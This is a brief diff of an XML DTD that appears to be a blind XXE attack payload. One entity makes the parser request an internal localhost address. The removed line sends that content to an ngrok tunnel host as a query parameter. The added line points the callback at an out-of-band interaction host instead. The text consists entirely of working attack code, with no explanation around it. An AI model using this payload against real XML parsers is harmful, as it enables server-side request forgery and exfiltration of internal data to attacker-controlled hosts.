@@ -1,3 +1,3 @@
 <!ENTITY % file SYSTEM "http://127.0.0.1:80/">
-<!ENTITY % payload "<!ENTITY send SYSTEM 'https://televisional-camryn-quarrelsomely.ngrok-free.dev/out?data=%file;'>">
+<!ENTITY % payload "<!ENTITY send SYSTEM 'https://d7e399sgtqkm637kim10gr4zafh1tk7t8.oast.online/ss.json;'>">
 %payload;
